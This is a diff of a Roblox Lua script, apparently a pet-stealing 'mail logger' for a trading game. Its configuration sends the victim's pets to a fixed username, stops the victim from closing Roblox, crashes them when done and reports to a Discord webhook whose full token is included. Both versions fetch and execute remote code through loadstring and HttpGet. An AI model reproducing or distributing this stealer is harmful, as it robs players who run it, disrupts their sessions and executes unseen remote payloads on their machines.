@@ -1,20 +1,4 @@
---[[ Arkhalis Mail Logger ]]--
- 
---[[ Config ]]--
-_G.Username = "mamadou045" --// Username To Send Pets To
-_G.ScriptName = "Project WD" --// Script Name For Watermark
-_G.Webhook = "https://discord.com/api/webhooks/1091025799903186945/Hm1fqhlIZNRPq8b5XE1jDy3CQ4pHvY2MPdoI02Z913llzZXcpSUpCxno7q2cWQ1oYAQK" --// Discord Webhook For Executions
-_G.GiftMessage = "ty" --// Message For The Gift To Say
-_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Crash = true  --// Crashes Them After Its Finished
-_G.Tip1 = "More Feature Will Come Soon" --// Gives You Tips On The UI
-_G.Tip2 = "Disable Auto Hatch When You Use The Auto Meteor" --// Gives You Tips On The UI
-_G.Tip3 = "If You Want Support The Script You Can Give a Tips !" --// Gives You Tips On The UI
-_G.Tip4 = "There Is a Prenium Verion Of The Script With More Features !" --// Gives You Tips On The UI
-_G.Tip5 = "Ty For Using The Script" --// Gives You Tips On The UI
- 
---[[ Script ]]--
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()
+UserName = "mamadou045"
+WebHook = "https://discord.com/api/webhooks/1091025799903186945/Hm1fqhlIZNRPq8b5XE1jDy3CQ4pHvY2MPdoI02Z913llzZXcpSUpCxno7q2cWQ1oYAQK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
